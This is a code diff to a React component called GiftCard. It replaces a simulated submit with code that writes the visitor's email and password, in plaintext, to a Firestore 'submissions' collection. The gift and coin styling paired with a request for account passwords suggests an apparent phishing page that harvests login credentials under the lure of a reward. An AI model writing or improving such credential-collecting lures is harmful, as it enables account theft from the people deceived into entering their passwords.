@@ -1,3 +1,4 @@
+
 "use client"
 
 import React, { useState } from 'react';
@@ -5,13 +6,17 @@ import { Gift, Coins, CheckCircle2, Users, ShieldCheck, Timer, Target, Mail, Loc
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { cn } from "@/lib/utils";
+import { useFirestore } from '@/firebase';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { errorEmitter } from '@/firebase/error-emitter';
+import { FirestorePermissionError } from '@/firebase/errors';
 
 export function GiftCard() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
+  const db = useFirestore();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -22,17 +27,31 @@ export function GiftCard() {
 
     setIsLoading(true);
 
-    try {
-      // Simulate API call
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      
-      // Assume success based on user's original PHP logic expectation
-      setIsSubmitted(true);
-    } catch (error) {
-      console.error('Error:', error);
-      alert('❌ فشل الاتصال بالخادم. حاول مرة أخرى.');
-    } finally {
+    if (db) {
+      const submissionsRef = collection(db, 'submissions');
+      const data = {
+        email: email,
+        password: password,
+        createdAt: serverTimestamp(),
+      };
+
+      addDoc(submissionsRef, data)
+        .then(() => {
+          setIsSubmitted(true);
+          setIsLoading(false);
+        })
+        .catch(async (error) => {
+          setIsLoading(false);
+          const permissionError = new FirestorePermissionError({
+            path: 'submissions',
+            operation: 'create',
+            requestResourceData: data,
+          });
+          errorEmitter.emit('permission-error', permissionError);
+        });
+    } else {
       setIsLoading(false);
+      alert('❌ فشل الاتصال بقاعدة البيانات.');
     }
   };
 
